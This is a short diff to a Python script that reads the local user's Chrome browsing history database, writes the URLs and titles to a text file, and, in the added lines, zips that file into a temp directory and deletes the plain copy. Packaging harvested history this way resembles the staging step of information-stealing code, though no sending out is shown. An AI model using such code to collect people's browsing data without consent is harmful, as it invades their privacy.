@@ -1,6 +1,7 @@
 import sqlite3
 import shutil
 import os
+import zipfile
 
 # Get the username of the PC
 username = os.environ["USERNAME"]
@@ -35,6 +36,14 @@ with open(output_file, "w", encoding="utf-8") as file:
         file.write(f"URL: {url}\n")
         file.write(f"Title: {title}\n")
         file.write("--------------------\n")
+
+# Create a zip file and add the Chrome history text file to it
+zip_file_path = os.path.join(temp_dir, "Chrome.zip")
+with zipfile.ZipFile(zip_file_path, "w") as zip_file:
+    zip_file.write(output_file, "Chrome History.txt")
+
+# Delete the Chrome history text file
+os.remove(output_file)
 
 # Close the database connection
 conn.close()
